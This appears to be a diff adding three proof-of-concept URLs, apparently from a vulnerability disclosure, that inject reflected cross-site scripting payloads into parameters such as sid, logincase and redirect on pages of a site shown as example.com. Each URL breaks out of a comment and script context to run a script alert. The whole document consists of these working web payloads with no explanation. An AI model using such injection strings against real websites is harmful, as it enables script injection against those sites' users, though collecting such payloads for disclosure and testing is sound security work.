@@ -1,0 +1,3 @@
+http://www.example.com/login.php?slct_pg_id=53&amp;sid=1*/--&gt;&lt;/script&gt;&lt;script&gt;alert(188017)&lt;/script&gt;&amp;slc_lang=fa
+http://www.example.com/page_arch.php?slc_lang=fa&amp;sid=1&amp;logincase=*/--&gt;&lt;/script&gt;&lt;script&gt;alert(188017)&lt;/script&gt;
+http://www.example.com/page.php?sid=1&amp;slc_lang=en&amp;redirect=*/--&gt;&lt;/script&gt;&lt;script&gt;alert(188017)&lt;/script&gt;
